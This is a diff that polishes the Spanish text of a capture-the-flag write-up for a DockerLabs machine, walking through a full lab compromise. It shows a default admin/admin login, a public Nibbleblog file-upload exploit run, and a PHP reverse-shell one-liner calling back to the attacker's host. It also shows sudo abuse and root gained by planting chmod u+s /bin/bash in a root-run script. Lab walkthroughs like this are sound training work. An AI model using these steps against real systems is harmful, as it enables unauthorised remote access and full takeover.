@@ -7,7 +7,7 @@ categories: DockerLabs
 
 | OS     | Dificultad  | Creator           |
 | ------ | ----------- | -------------     | 
-| Linux  |  Facil      | ElPinguinoDeMario | 
+| Linux  |  Fácil      | ElPinguinoDeMario | 
 
 
 # Reconocimiento
@@ -40,7 +40,7 @@ nmap -p 80-sCV 172.17.0.2 -oG targeted
 
 # Exploración Web
 
-Al acceder a la página web, observamos un panel de apache que estan pordefecto. 
+Al acceder a la página web, observamos un panel de Apache que está configurado por defecto. 
 
 ![image](https://github.com/user-attachments/assets/0c8ea714-be14-4a40-ab76-f86d94cf2876)
 
@@ -56,31 +56,31 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-li
 
 ![image](https://github.com/user-attachments/assets/eaadd2b6-622e-4946-b00d-09b348b36ca9)
 
-No encontramos nada por ahi, vamos a darle otro enfoque.
+No encontramos nada relevante por esta vía, así que decidimos cambiar el enfoque.
 
 ![image](https://github.com/user-attachments/assets/0ea9d0a8-b545-4b7f-844a-89096d3674f1)
 
-En el codigo fuente vemos una ruta un poco extraña, asi que entraremos en ella para ver si encontramos algo.
+En el código fuente de la página encontramos una ruta que parece interesante, decidimos seguirla para investigar.
 
 ![image](https://github.com/user-attachments/assets/b4e80b01-4b77-4390-b6a2-cfcc571dfd9e)
 
-Nos redirecciona, y vemos otra ruta la cual llamada `admin.php`.
+Nos redirige a otra ruta llamada `admin.php`.
 
 ![image](https://github.com/user-attachments/assets/df5b70eb-2df2-40e7-8d3e-bf69d599fddb)
 
-Al porbar contraseñas por defecto probamos `admin`/`admin` coseguimos acceder.
+Al probar contraseñas por defecto, utilizamos` admin`/`admin` y conseguimos acceder.
 
 ![image](https://github.com/user-attachments/assets/cd5592ea-31d8-4fd2-834c-f27a794451ea)
 
-Mirando por un poco la pagina podemos ver dentro de la seccion de `settings` al final vemos la version que tienen de ese servicio.
+Explorando la página en la sección de *settings*, encontramos la versión del servicio que está en ejecución.
 
 ![image](https://github.com/user-attachments/assets/da0af440-72e2-4ad6-9e0f-b7d9a7bc14b7)
 
-Vamos a ver si existe algun exploit de esta version.
+Vamos a ver si existe algún exploit disponible para esta versión.
 
 ![image](https://github.com/user-attachments/assets/a928cf5a-d32c-494a-ba5b-95ef230b1e83)
 
-Existen varios exploits y todos para la version que tenemos nosotros.
+Existen varios exploits para la versión que tenemos.
 
 ![image](https://github.com/user-attachments/assets/1e33f612-aaff-4481-93a1-ba8824a22c11)
 
@@ -91,15 +91,15 @@ Usaremos este repositorio de github para explotarlo [CVE-2015-6967](https://gith
 
 ![image](https://github.com/user-attachments/assets/ef2fd301-d900-4d9e-a410-9a5757ad042f)
 
-Viendo como funciona el script vemos que funciona a traves de un plugin llamado `my_image`.
+El exploit funciona a través de un plugin llamado `my_image`.
 
 ![image](https://github.com/user-attachments/assets/bf639fa4-57c7-4d69-bd64-96b417ac3297)
 
-Me da a mi que debriamos de intalarlo ya que el `exploit`, hace uso de ese plugin , pero no veo que nos lo instale.
+Parece que necesitamos instalar el plugin, ya que el exploit lo utiliza, pero no lo instala automáticamente.
 
 ![image](https://github.com/user-attachments/assets/5614a6c2-1616-4ab4-8ee9-8569d4433bc9)
 
-Ahora vamos a ejecutar el script , para ello antes crearemos nuestra revershell
+Vamos a ejecutar el exploit. Antes de hacerlo, generamos nuestra reverse shell.
 
 ### Intrusión en la Máquina
 
@@ -107,34 +107,36 @@ Generamos la reverseshell utilizando **Pentest Monkey**, una herramienta popular
 
 [Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 
-Cuando la tengamos solo falta ejecutar el `exploit`, para ello primero descargaremos el repositorio.
+Una vez que tengamos la reverse shell lista, descargamos el repositorio y ejecutamos el exploit.
 
 ```bash
 git clone https://github.com/dix0nym/CVE-2015-6967.git
 ```
 ![image](https://github.com/user-attachments/assets/961eed03-0f9b-4739-910b-68db1bcb83d0)
 
-Ya que tenemos todo esto vamos ahora a poner el siguiente comando:
+Ejecutamos el siguiente comando para lanzar el exploit:
+
 ```bash
 python3 exploit.py --url http://172.17.0.2/nibbleblog/ --username admin --password admin --payload ../shell.php
 ```
 ![image](https://github.com/user-attachments/assets/05587267-7e2a-493c-a53d-f8014fa5622f)
 
-Una vez hecho esto si investigamos un poco por la web vemos que en este repositorio estan los plugins http://172.17.0.2/nibbleblog/content/private/plugins/
+Investigando un poco más, descubrimos que en este repositorio están los plugins:
+`http://172.17.0.2/nibbleblog/content/private/plugins/`
 
 ![image](https://github.com/user-attachments/assets/f5497815-e9bc-4367-9b0f-43be7cc8c2ec)
 
 ### Pasos para Cargar la Reverseshell
 
-Nos ponemos a escuchar por netcat en mi caso por el 4444
+Nos ponemos a escuchar en nuestro caso el puerto 4444 con `netcat`:
 ```bash 
 nc -lvnp 4444
 ```
-Luego, accedemos a la ruta de la página web donde hemos cargado la reverseshell, *le damos al archivo llamado `image.php`*:
+Luego accedemos a la ruta donde subimos la reverse shell, haciendo clic en el archivo `image.php`:
 
 ![image](https://github.com/user-attachments/assets/87fb6f40-fbe1-4394-b1b4-503c15c52bd4)
 
-Y ya tendriamos acceso a la maquina.
+Con esto, ya tendríamos acceso a la máquina.
 
 ![image](https://github.com/user-attachments/assets/63dc6070-4522-4655-9f14-f39f94fa82d5)
 
@@ -173,21 +175,21 @@ export SHELL=bash
 
 # Intrusion
 
-Ya estamos dentro de la máquina. Si ejecutamos el comando `sudo -l`, vemos que podemos ejecutar `php` como `chocolate`. Si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins](https://gtfobins.github.io/).
+Ahora que estamos dentro de la máquina, si ejecutamos el comando `sudo -l`, vemos que podemos ejecutar `php` como el usuario `chocolate`. Si no sabemos cómo aprovechar esto, podemos recurrir a [GTFOBins](https://gtfobins.github.io/).
 
 ![image](https://github.com/user-attachments/assets/139acb72-7157-4ef0-8099-3a8e6851d7c2)
 
-Para ejecutar una shell como usuario debemos de poner lo siguiente:
+Para obtener una shell como el usuario `chocolate`, ejecutamos el siguiente comando:
 
 ```shell
 www-data@5a6d69b701d7:/$ CMD="/bin/sh"
 www-data@5a6d69b701d7:/$ sudo -u chocolate php -r "system('$CMD');"
 ```
-Si hacesmo un whoami podemos ver que estamos con el usuario chocolate.
+Si ejecutamos `whoami`, podemos ver que ya somos el usuario chocolate.
 
 ![image](https://github.com/user-attachments/assets/f24c07d0-8694-4c64-b01d-caf7347f6b6b)
 
-En mi caso he tenido problemas al ejecutar una shell, por lo que hice otra reverse shell y volvi a crear una TTY.
+Tuve problemas al ejecutar una shell directamente, así que decidí generar otra reverse shell y repetir los pasos para obtener una TTY interactiva.
 
 ```bash
 sudo -u chocolate /usr/bin/php -r '$sock=fsockopen("172.17.0.1", 4444);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -200,15 +202,17 @@ nc -lvnp 4444
 ```
 ![image](https://github.com/user-attachments/assets/8d272dbe-51ec-4f56-899b-eaf2a3744165)
 
-Y volvemos a hacer los pasos para una shell interactiva.
+Una vez reconectados a la máquina con la nueva reverse shell, repetimos los pasos para configurar una shell interactiva (TTY). 
 
 # Accedor Root
 
-Vamos con el final despues de mirar sudo -l y tambien si teniamos permisos en algun binario SUID, no encontrasmo nada por lo que nos pusimos a mirar dentro de los procesos del sistema y vimos que root ejecutaba un `script.php`.
+Investigamos un poco más dentro del sistema y observamos que hay un proceso ejecutado por root que corre un script llamado `script.php`.
 
 ![image](https://github.com/user-attachments/assets/d02290f2-e767-4831-89a0-83cfa22a183f)
 
-Vemos que tenemos permisos para modificar el archivo por lo que insertaremos dentro una shell para ser root.
+El gran descubrimiento aquí es que tenemos permisos para modificar este archivo `script.php`. Como podemos editarlo, decidimos insertar una línea que nos dará una shell como usuario `root`.
+
+Modificamos el contenido de `script.php` para que ejecute una shell elevada:
 
 ![image](https://github.com/user-attachments/assets/283e2201-7c80-4f78-a1ec-ea80de878f97)
 
@@ -221,15 +225,17 @@ exec("chmod u+s /bin/bash");
 ```
 ![image](https://github.com/user-attachments/assets/4f0b10d2-6146-4835-a4eb-4959835d69cb)
 
-Y cambiando los eso con poniendo solo falta general una shell.
+Con esta línea, al ejecutarse el script por el proceso `root`, el binario `bash` se actualizará para tener el bit SUID (Set User ID). Esto significa que cualquier usuario que ejecute este binario obtendrá permisos de `root`.
+
+Tras esperar a que el script se ejecute automáticamente, simplemente lanzamos una shell de la siguiente manera:
 
 ```bash
 bash -p
 ```
 
-Ya seriamos root 
+Ahora, verificamos si efectivamente hemos obtenido privilegios de `root` ejecutando `whoami`.
+
 
 ![image](https://github.com/user-attachments/assets/d518ea73-baa7-491c-bba1-b25029b181cf)
 
-
-
+¡Y listo! Ahora somos `root` en la máquina. 
